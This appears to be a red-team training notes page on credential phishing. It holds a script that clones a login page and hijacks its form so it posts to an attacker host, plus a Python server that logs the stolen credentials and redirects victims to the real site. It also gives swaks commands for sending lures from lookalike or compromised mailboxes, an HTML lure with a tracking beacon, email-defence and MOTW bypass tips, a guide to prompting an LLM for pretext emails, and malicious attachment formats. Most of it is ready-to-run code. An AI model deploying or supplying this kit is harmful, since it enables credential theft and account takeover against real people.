Credential Phishing

Stealing credentials by pretexting a login page — bypassing SPF/DKIM/DMARC, MOTW propagation rules, cloning a real login page with wget or SingleFile CLI, a Python capture server that logs POSTs and 302s the victim to the real site, swaks for SMTP delivery, Evilginx2/Modlishka MFA-bypass context, and FIDO2/WebAuthn as the recommended remediation.

This page covers stealing credentials by pretexting a login page — cloning a real site, hijacking the form, and capturing the POST on an attacker-controlled server. Different focus from initial-access-redteam.md (which is about payload delivery / execution) and client-side-attacks.md (which is about macros / library-ms code execution).

Assumed pretext: user gets an email that looks like it comes from an IT provider (Zoom / Okta / M365 / internal SSO), clicks the link, lands on a cloned login page, enters credentials. Your server captures them, then bounces the user to the real site so nothing feels off.

Email Defences to Bypass

  • SPF (Sender Policy Framework) — the domain publishes which IPs may send mail. Fails if you send from an IP not in the SPF record.
  • DKIM (DomainKeys Identified Mail) — the sender signs the message with a private key; recipient checks the public key in DNS. You cannot forge DKIM without the private key.
  • DMARC — enforcement policy combining SPF + DKIM alignment (p=reject / quarantine / none).
  • Proofpoint / Mimecast / Barracuda — inline scanners that unfold links, sandbox attachments, and match against threat intel.

Bypass patterns:

  • Send from a lookalike domain (micros0ft.com, zoorn.us) — SPF/DKIM pass because you control the sending domain.
  • Legitimate mailer abuse — Mailchimp / SendGrid / Amazon SES with a warmed-up sender.
  • Homograph domains (IDN — zооm.us with Cyrillic о).
  • Compromised third-party mailbox — best trust signal because the sender is real.

Mark-of-the-Web (MOTW)

Files downloaded from the internet get an NTFS Alternate Data Stream named Zone.Identifier with ZoneId=3. Office reads it and opens the file in Protected View; SmartScreen may block execution entirely.

Check for MOTW

Get-Content .\file.docm -Stream Zone.Identifier
## [ZoneTransfer]
## ZoneId=3
## ReferrerUrl=...

Strip MOTW (as attacker or defender testing)

Unblock-File .\file.docm
## or
Remove-Item .\file.docm -Stream Zone.Identifier

Delivery formats that DON'T propagate MOTW to inner files

  • ISO / IMG — contents lack the ADS
  • VHD / VHDX — same
  • 7z / RAR with encryption — AV can't scan; ADS often lost on extract
  • Symbolic links inside a ZIP — ADS not applied

Pretext Generation with an LLM (offline only)

EXAM RULE: LLMs (ChatGPT, Claude, Gemini, Copilot, GPT4All, etc.) are BANNED during the OSCP exam and the report window. Use them only in preparation and training, never on exam-day.

Pattern that works: paste a real internal comms sample -> ask for tone/length match -> iterate on the ask.

Prompt: "Rewrite this into an email from the IT team. The subject is
mandatory Zoom re-registration by <DATE>. Match the tone of the
sample below. Keep it under 90 words. End with a call to action to
click a link to verify their account."

<paste real internal email you scraped>

Follow-up prompts to sharpen:

  • "Add urgency but not fear."
  • "Rewrite for a mobile-first reader — first sentence must hook."
  • "Localise: Australian English, spelling, and workday hours."
  • "Include the recipient's first name at the start."

Cloning a Real Login Page

Simple case — wget mirror

Works for server-side rendered pages (no heavy JS).

wget -E -k -K -p -e robots=off -nd "https://target.example.com/signin"

Flag legend:

  • -E — append .html to files that need it
  • -k — rewrite links so the mirror works offline
  • -K — keep original backup of every rewritten file (.orig)
  • -p — download images, CSS, JS needed to render the page
  • -e robots=off — ignore robots.txt
  • -nd — flatten into current dir (no subdirs)

JS-heavy case — SingleFile CLI

Modern SPA login pages (Zoom, Okta, M365) need a real browser to render. single-file-cli drives headless Chromium and saves everything (HTML + inlined CSS/JS/images) as one file.

sudo apt install -y nodejs npm chromium
sudo npm install -g single-file-cli
single-file "https://target.example.com/signin" signin.html \
  --browser-executable-path /usr/bin/chromium

Result: one signin.html byte-identical rendering of the target.

Stripping cookie banners / OneTrust modals

Automate the DOM edit with BeautifulSoup so you don't have to reclone by hand every time.

clean_signin.py:

#!/usr/bin/env python3
"""Strip OneTrust modal + inject a password overlay + hijack the form."""
from bs4 import BeautifulSoup

with open("signin.html", "r") as f:
    soup = BeautifulSoup(f, "html.parser")

## Kill OneTrust cookie modal (common blocker of the login button)
for tag in soup.find_all(id=lambda x: x and "onetrust" in x.lower()):
    tag.decompose()
for tag in soup.find_all(class_=lambda x: x and any("onetrust" in c.lower() for c in x)):
    tag.decompose()

## Hijack the login <form> to POST to our capture server
form = soup.find("form")
if form:
    form["action"]  = "http://<LHOST>/steal"
    form["method"]  = "POST"
    form["target"]  = "_self"

## (Optional) Overlay message: "Your session expired — please sign in again"
overlay = soup.new_tag("div", style="position:fixed;top:0;left:0;right:0;background:#fee;color:#900;padding:12px;text-align:center;font-family:sans-serif;z-index:9999")
overlay.string = "Your session expired — please sign in to continue."
soup.body.insert(0, overlay)

with open("signin_ready.html", "w") as f:
    f.write(str(soup))
print("[+] Wrote signin_ready.html")

Run: python3 clean_signin.py

Capture Server

Minimal Python HTTP server that logs any POST and redirects the victim to the real site so nothing looks wrong.

cred_server.py:

#!/usr/bin/env python3
"""Credential capture: logs POST body, 302s user to the real site."""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import datetime, os

REAL_SITE = "https://target.example.com/signin"
LOG_FILE  = "creds.log"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve the cloned page for any GET
        with open("signin_ready.html", "rb") as f:
            page = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(page)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace")
        parsed = parse_qs(body)
        line = f"[{datetime.datetime.utcnow().isoformat()}Z] {self.client_address[0]} {self.headers.get('User-Agent','?')}\n  {body}\n  parsed={parsed}\n"
        with open(LOG_FILE, "a") as f:
            f.write(line)
        print(line, flush=True)
        # 302 to real site so the victim doesn't get suspicious
        self.send_response(302)
        self.send_header("Location", REAL_SITE)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass  # keep console clean

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 80), Handler).serve_forever()

Run as root (needs port 80):

sudo python3 cred_server.py
tail -f creds.log

For HTTPS delivery (Chrome/Firefox refuse to autofill on http://), front the server with a Let's Encrypt cert on nginx or use stunnel.

Sending the Email

swaks (Swiss Army Knife for SMTP) is the exam-safe choice for controlled delivery.

Basic outbound send through your own SMTP relay:

swaks --to victim@target.com \
      --from it-support@lookalike-domain.com \
      --server smtp.lookalike-domain.com \
      --header "Subject: Mandatory Zoom re-registration by Friday" \
      --body @body.txt \
      --add-header "Content-Type: text/html"

Authenticated SMTP relay (when you have creds on the target's own mailbox — the strongest pretext):

swaks -t victim@target.com \
      --from insider@target.com \
      --server mail.target.com:587 \
      --auth PLAIN \
      --auth-user insider@target.com \
      --auth-password "<PASS>" \
      --tls \
      --header "Subject: Mandatory Zoom re-registration" \
      --body @body.txt \
      --add-header "Content-Type: text/html"

Flag legend:

  • -t / --to — recipient (repeat -t for many)
  • --from — MAIL FROM header
  • --server — SMTP host (host:port)
  • --auth PLAIN — AUTH mechanism (PLAIN, LOGIN, CRAM-MD5)
  • --auth-user / --auth-password — credentials
  • --tls — STARTTLS (--tls-on-connect for implicit TLS on 465)
  • --body @file — read body from file (else pass a string)
  • --header — add header
  • --add-header — set Content-Type so HTML renders
  • --attach @file — attach file (see client-side-attacks.md for macro delivery)
  • --suppress-data — don't echo body to console (cleaner logs)
  • -ap — prompt interactively for AUTH user/pass

Body template (body.txt) — HTML with tracking pixel + one action link:

<html>
<body>
<p>Hi <b>{{first_name}}</b>,</p>
<p>Per our compliance rollout, all users must re-register their Zoom session before <b>Friday 5pm</b>.
This takes 30 seconds and stops your calendar-invite links from breaking.</p>
<p><a href="http://<LHOST>/signin">Click here to re-register</a></p>
<p>Thanks,<br>
IT Support</p>
<img src="http://<LHOST>/beacon.gif?u={{email}}" width="1" height="1">
</body>
</html>

The beacon pixel URL logs opens (User-Agent + IP + ?u= who).

MFA-Bypass Tooling (context only)

If the account has MFA the plain credential-steal is worthless. Real red-team tools that proxy the whole login (steal creds + session cookie):

  • Evilginx2 — Nginx reverse-proxy phishlets, harvests session cookies after MFA
  • Modlishka — similar
  • CredMaster — cloud-relayed brute-force + password-spray

FIDO2 / WebAuthn / Passkeys defeat all reverse-proxy MFA phishing — the origin check on the authenticator refuses to sign anything that isn't the real domain. Note this in your report as the recommended remediation.

Attachment Formats (see client-side-attacks.md)

If you're delivering code execution not credentials, don't attach here — use the client-side chain. Quick risk-table for reference:

Extension Risk Delivery notes
.docm / .xlsm VBA macro on open Protected View blocks by default; social pretext must justify Enable Content
.iso / .img / .vhd Mounts as drive; MOTW lost Excellent — LNK inside auto-runs on double-click
.hta mshta.exe runs as trusted User must Save and run; SmartScreen may block
.lnk Any inline command Best inside an ISO/IMG or via .Library-ms (WebDAV)
.one OneNote with embedded exe Older exploit path, still works on unpatched hosts
.svg Inline JS + external fetch Foothold via <script> in modern SVG renderers
.chm Compiled HTML help with mshta payload Older but reliable
.msi Installer with CustomAction running code Signed by attacker cert = trusted UI
